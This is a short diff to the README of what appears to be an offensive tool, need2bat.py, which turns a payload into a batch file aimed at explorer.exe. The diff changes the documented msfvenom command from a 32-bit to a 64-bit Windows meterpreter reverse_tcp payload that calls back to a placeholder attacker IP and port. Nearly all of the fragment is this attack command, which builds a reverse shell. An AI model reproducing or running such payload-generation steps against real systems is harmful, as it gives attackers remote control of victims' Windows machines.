@@ -36,7 +36,7 @@ need2bat.py [-h] -u [http://url] -d <explorer.exe> -o <output.bat>
   
 - use this command to make <payload.bin> file (must be installed metasploit):
 ```
-msfvenom -p windows/meterpreter/reverse_tcp lhost=ur_ip lport=ur_port -f raw > ./payload.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ur_ip lport=ur_port -f raw > ./payload.bin
 ```
 
 # info:
